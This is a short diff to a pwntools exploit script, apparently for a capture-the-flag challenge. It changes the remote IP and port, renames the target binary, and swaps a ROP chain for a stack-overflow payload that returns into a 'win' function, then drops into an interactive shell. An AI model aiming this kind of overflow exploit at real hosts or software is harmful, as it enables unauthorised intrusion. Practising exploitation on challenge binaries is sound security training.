@@ -1,6 +1,6 @@
 from pwn import *
-HOST='103.167.136.75'
-PORT=11201
+HOST='13.212.97.214'
+PORT=5005
 
 # Allows you to switch between local/GDB/remote from terminal
 def start(argv=[], *a, **kw):
@@ -33,7 +33,7 @@ continue
 '''.format(**locals())
 
 # Binary filename
-exe = './soal'
+exe = './bank_soal'
 # This will automatically get context arch, bits, os etc
 elf = context.binary = ELF(exe, checksec=False)
 # Change logging level to help with debugging (error/warning/info/debug)
@@ -57,12 +57,12 @@ io = start()
 # Build the payload
 payload = flat({
     offset: [
-        rop.chain()
+        p64(win)
     ]
 })
-
+print(payload)
 # Send the payload
 # io.sendlineafter(b'}\n', payload)
-io.sendline(payload)
+# io.sendline(payload)
 # Got Shell?
 io.interactive()
